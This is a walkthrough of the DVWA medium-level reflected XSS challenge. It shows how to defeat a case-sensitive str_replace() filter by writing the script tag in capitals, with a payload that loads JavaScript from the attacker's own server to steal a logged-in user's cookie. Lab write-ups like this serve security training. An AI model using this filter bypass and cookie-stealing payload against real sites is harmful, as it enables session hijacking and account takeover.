<b>Challenge URL:</b> /dvwa/vulnerabilities/xss_r/
<br>
<b>Objective:</b> Steal the cookie of a logged-in user.
<br>
<b>Tools needed:</b> A temporary web server
<br><br>
<i>Did you remember to read this section's <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/README.md" target="_blank">README</a>?</i>

<h2><b>The Guide</b></h2>

<i>Since this challenge is very similar to the easy mode challenge, I'd highly recommend re-reading <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/Challenge%2011:%20XSS%20(Reflected).md" target="_blank">our notes from before</a>. We'll be using a lot of the analysis and code from before.</i>

<h3><b>What's Changed</b></h3>

Let's start by clicking the "View Source" button on the bottom right of the challenge.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/xssrsource.png" width="500">

Two things to note here:
<ul>
  <li>While we do see a header called "X-XSS-Protection", it's not as scary as we fear. The developer set this to "0", which means the header <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection" target="_blank">actually disables XSS filtering</a> instead of enabling it. Nice going, dev!</li>
  <li>The <b>name</b> variable gets subjected to a string replace function, which replaces all instances of <code>&#60;script&#62;</code> with <code>null</code>.</li>
</ul>

<h3><b>Crafting a New Exploit</b></h3>

So we know the header doesn't accomplish anything, so the crux of the exploit is avoiding the string replacement. 

When reading documentation on <code><a href="https://www.w3schools.com/php/func_string_str_replace.asp" target="_blank">str_replace()</a></code>, we note a key line as follows:

<blockquote>Note: This function is case-sensitive. Use the str_ireplace() function to perform a case-insensitive search.</blockquote>

It can't be that easy, can it? Since <code>str_replace()</code> looks for the literal string "<script>", all we need to do is vary the case a bit as follows:

<code>&#60;SCRIPT src="http://[your_Kali_IP]:9999/a.js"&#62;&#60;/SCRIPT&#62;</code>

Let's try it out!

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/xssrsuccess.png" width="500">

Cookie stolen and challenge complete!
